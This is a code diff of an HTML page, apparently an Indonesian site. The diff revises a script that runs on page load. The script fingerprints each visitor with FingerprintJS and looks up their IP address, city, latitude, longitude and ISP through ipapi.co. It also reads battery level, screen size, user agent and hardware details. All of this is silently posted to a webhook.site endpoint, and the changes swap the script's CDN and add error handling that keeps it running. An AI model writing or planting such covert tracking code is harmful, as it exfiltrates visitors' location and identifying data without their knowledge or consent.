@@ -470,40 +470,43 @@ Selalu.</p>
     </script>
 
 </body>
-<script src="https://openfpcdn.io/fingerprintjs/v3"></script>
+<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
 <script>
 (async () => {
-  const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
-  const battery = await navigator.getBattery();
-  const fp = await FingerprintJS.load();
-  const result = await fp.get();
+  try {
+    const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
+    const battery = await navigator.getBattery();
+    const fp = await FingerprintJS.load();
+    const result = await fp.get();
 
-  const log = {
-    ip: ipData.ip,
-    location: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
-    latitude: ipData.latitude,
-    longitude: ipData.longitude,
-    isp: ipData.org,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    userAgent: navigator.userAgent,
-    language: navigator.language,
-    screen: `${screen.width}x${screen.height}`,
-    battery: battery.level,
-    platform: navigator.platform,
-    cores: navigator.hardwareConcurrency,
-    touch: 'ontouchstart' in window,
-    fingerprint: result.visitorId,
-    timestamp: new Date().toISOString()
-  };
+    const log = {
+      ip: ipData.ip,
+      location: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
+      latitude: ipData.latitude,
+      longitude: ipData.longitude,
+      isp: ipData.org,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      screen: `${screen.width}x${screen.height}`,
+      battery: battery.level,
+      platform: navigator.platform,
+      cores: navigator.hardwareConcurrency,
+      touch: 'ontouchstart' in window,
+      fingerprint: result.visitorId,
+      timestamp: new Date().toISOString()
+    };
 
-  // Gunakan FormData agar dikirim sebagai form biasa, bukan JSON
-  const form = new FormData();
-  form.append("data", JSON.stringify(log));
+    const form = new FormData();
+    form.append("data", JSON.stringify(log));
 
-  fetch("https://webhook.site/4580ed67-0936-40cc-9d67-9d806529ef38", {
-    method: "POST",
-    body: form
-  });
+    fetch("https://webhook.site/4580ed67-0936-40cc-9d67-9d806529ef38", {
+      method: "POST",
+      body: form
+    });
+  } catch (e) {
+    console.error("Tracking error:", e);
+  }
 })();
 </script>
 </html>
